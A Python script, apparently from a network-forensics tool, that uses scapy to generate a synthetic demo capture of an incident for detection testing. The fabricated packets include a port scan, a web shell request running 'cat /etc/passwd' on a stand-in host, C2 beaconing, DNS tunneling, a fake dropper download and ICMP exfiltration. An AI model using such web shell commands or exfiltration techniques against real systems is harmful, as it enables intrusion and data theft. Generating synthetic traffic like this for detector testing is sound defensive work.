#!/usr/bin/env python3
"""Generate NetSleuth's demo capture: a complete, synthetic incident.

The story (all traffic is fabricated — nothing here is real malware):

  1. 10:00:00  lab-pc (192.168.1.50) behaves normally: DNS for
               files.example.com + a plain HTTP page fetch.
  2. 10:01:00  A SYN port scan against the file server (203.0.113.9).
  3. 10:02:00  Cleartext FTP login with weak credentials to the same box.
  4. 10:03:00  Timer-driven C2 beacon: 12 connections, 60s apart, to
               198.51.100.66:4444 with near-identical payloads.
  5. 10:15:00  DNS tunneling: 30 base32-encoded subdomain queries under
               t.c2bad.example, TXT answers carrying encoded data.
  6. 10:16:00  Web shell interaction: GET /uploads/shell.php?cmd=cat+/etc/passwd
               on bad.example — the response leaks a flag.
  7. 10:17:00  Tool download: dropper.bin (MZ executable) over HTTP.
  8. 10:18:00  Data smuggled inside ICMP echo payloads.

Every element maps to a NetSleuth detection or extractor — this is the
capture used in docs/INVESTIGATION.md.

Usage:  python examples/generate_demo.py [out.pcap]
"""

from __future__ import annotations

import base64
import random
import sys
from pathlib import Path

from scapy.all import DNS, DNSQR, DNSRR, Ether, ICMP, IP, Raw, TCP, UDP, wrpcap

BASE = 1755472800.0            # 2025-08-17 20:00:00 UTC
LAB = "192.168.1.50"
GW = "192.168.1.1"
DNS_SRV = "8.8.8.8"
FILES = "203.0.113.9"
C2 = "198.51.100.66"
BAD = "203.0.113.66"
LAB_MAC = "08:00:27:11:11:11"
OTHER_MAC = "08:00:27:22:22:22"

rng = random.Random(1337)


def eth(src, dst):
    return Ether(src=src, dst=dst)


def dns_q(name, ts, qtype="A"):
    p = (eth(LAB_MAC, OTHER_MAC) / IP(src=LAB, dst=DNS_SRV) /
         UDP(sport=5353, dport=53) / DNS(rd=1, qd=DNSQR(qname=name, qtype=qtype)))
    p.time = ts
    return p


def dns_a(name, ts, answers, atype="A", txt=False):
    rrs = [DNSRR(type=("TXT" if txt else atype), rdata=a, ttl=120) for a in answers]
    p = (eth(OTHER_MAC, LAB_MAC) / IP(src=DNS_SRV, dst=LAB) /
         UDP(sport=53, dport=5353) / DNS(qr=1, qd=DNSQR(qname=name), an=rrs))
    p.time = ts
    return p


def tcp_conv(cip, cport, sip, sport, c2s, s2c, base_ts, handshake=True,
             close=True, seg=1400):
    pkts = []
    t = base_ts
    cseq, sseq = 1000, 9000

    def emit(src, sp, dst, dp, flags, seq, ack, payload=b""):
        nonlocal t
        m1 = LAB_MAC if src == LAB or src == GW else OTHER_MAC
        m2 = OTHER_MAC if m1 == LAB_MAC else LAB_MAC
        if src.startswith("192.168") and dst.startswith("192.168"):
            m1, m2 = LAB_MAC, OTHER_MAC if src == LAB else LAB_MAC
        p = (eth(m1, m2) / IP(src=src, dst=dst) /
             TCP(sport=sp, dport=dp, flags=flags, seq=seq, ack=ack))
        if payload:
            p = p / Raw(payload)
        p.time = t
        t += 0.0006
        pkts.append(p)

    if handshake:
        emit(cip, cport, sip, sport, "S", cseq, 0)
        emit(sip, sport, cip, cport, "SA", sseq, cseq + 1)
        emit(cip, cport, sip, sport, "A", cseq + 1, sseq + 1)
        cseq += 1
        sseq += 1
    for chunk in c2s:
        for i in range(0, len(chunk), seg):
            seg_b = chunk[i:i + seg]
            emit(cip, cport, sip, sport, "PA", cseq, sseq, seg_b)
            cseq += len(seg_b)
    for chunk in s2c:
        for i in range(0, len(chunk), seg):
            seg_b = chunk[i:i + seg]
            emit(sip, sport, cip, cport, "PA", sseq, cseq, seg_b)
            sseq += len(seg_b)
    if close:
        emit(cip, cport, sip, sport, "FA", cseq, sseq)
        emit(sip, sport, cip, cport, "FA", sseq, cseq + 1)
        emit(cip, cport, sip, sport, "A", cseq + 1, sseq + 1)
    return pkts


def build() -> list:
    pkts = []
    t = BASE

    # -- 1. normal browsing ------------------------------------------------
    pkts.append(dns_q("files.example.com", t)); t += 0.02
    pkts.append(dns_a("files.example.com", t, [FILES])); t += 0.05
    page = b"<html><body>hello from example</body></html>"
    pkts += tcp_conv(LAB, 44001, FILES, 80,
                     [b"GET /index.html HTTP/1.1\r\nHost: files.example.com\r\n"
                      b"User-Agent: Mozilla/5.0 (X11; Linux x86_64)\r\n\r\n"],
                     [b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n"
                      b"Content-Length: " + str(len(page)).encode() + b"\r\n\r\n"
                      + page], t)
    t += 2

    # -- 2. SYN port scan against FILES ------------------------------------
    for i, port in enumerate(range(20, 90)):
        p = (eth(LAB_MAC, OTHER_MAC) / IP(src=LAB, dst=FILES) /
             TCP(sport=45000 + i, dport=port, flags="S", seq=1000 + i))
        p.time = t + i * 0.005
        pkts.append(p)
        if port == 21 or port == 80:            # two open ports answer
            r = (eth(OTHER_MAC, LAB_MAC) / IP(src=FILES, dst=LAB) /
                 TCP(sport=port, dport=45000 + i, flags="SA", seq=5000 + i,
                     ack=1001 + i))
            r.time = t + i * 0.005 + 0.002
            pkts.append(r)
    t += 60

    # -- 3. cleartext FTP login --------------------------------------------
    pkts += tcp_conv(LAB, 45100, FILES, 21,
                     [b"USER backup_admin\r\nPASS Summer2024!\r\nSYST\r\nQUIT\r\n"],
                     [b"220 files.example.com FTP\r\n331 password required\r\n"
                      b"230 logged in\r\n215 UNIX Type: L8\r\n221 bye\r\n"], t)
    t += 60

    # -- 4. C2 beacon: 12 connections, 60s apart, similar payloads ----------
    for i in range(12):
        pkts += tcp_conv(LAB, 46000 + i, C2, 4444,
                         [b"\x00\x02" + b"A" * 48],
                         [b"\x00\x01" + b"B" * 32], t, close=False)
        t += 60.0

    # -- 5. DNS tunneling under t.c2bad.example -----------------------------
    for i in range(30):
        chunk = base64.b32encode(rng.randbytes(24)).decode().lower().rstrip("=")
        name = f"{chunk}.t.c2bad.example"
        pkts.append(dns_q(name, t))
        t += 0.05
        reply = base64.b32encode(rng.randbytes(40)).decode()
        pkts.append(dns_a(name, t, [f"v1.0.{reply[:80]}"], txt=True))
        t += 0.05
    t += 30

    # -- 6. web shell: probe + response with a flag -------------------------
    flag_body = (b"root:x:0:0:root:/root:/bin/bash\n"
                 b"daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
                 b"<!-- picoCTF{f0ll0w_th3_str3ams} -->\n")
    pkts += tcp_conv(LAB, 47001, BAD, 80,
                     [b"GET /uploads/shell.php?cmd=cat%20/etc/passwd HTTP/1.1\r\n"
                      b"Host: bad.example\r\nUser-Agent: curl/7.81.0\r\n\r\n"],
                     [b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n"
                      b"Content-Length: " + str(len(flag_body)).encode()
                      + b"\r\n\r\n" + flag_body], t)
    t += 30

    # -- 7. tool download (fake MZ executable) ------------------------------
    dropper = b"MZ" + bytes(rng.randrange(256) for _ in range(4096))
    pkts += tcp_conv(LAB, 47002, BAD, 80,
                     [b"GET /payload/dropper.bin HTTP/1.1\r\nHost: bad.example\r\n"
                      b"User-Agent: python-requests/2.28.0\r\n\r\n"],
                     [b"HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\n"
                      b"Content-Length: " + str(len(dropper)).encode()
                      + b"\r\n\r\n" + dropper], t)
    t += 30

    # -- 8. ICMP data channel ----------------------------------------------
    for i in range(6):
        blob = base64.b64encode(f"exfil-chunk-{i:02d}-".encode() +
                                rng.randbytes(24))
        p = (eth(LAB_MAC, OTHER_MAC) / IP(src=LAB, dst=C2) /
             ICMP(type=8) / Raw(blob))
        p.time = t + i
        pkts.append(p)

    for i, p in enumerate(pkts):
        if not p.time:
            p.time = BASE + i * 0.001
    return pkts


def main() -> None:
    out = sys.argv[1] if len(sys.argv) > 1 else \
        str(Path(__file__).parent / "demo.pcap")
    pkts = build()
    wrpcap(out, pkts)
    print(f"wrote {out}: {len(pkts)} packets, synthetic incident story")
    print("  normal browsing · SYN scan · cleartext FTP · C2 beacon ·")
    print("  DNS tunnel · web shell + flag · dropper download · ICMP data")


if __name__ == "__main__":
    main()
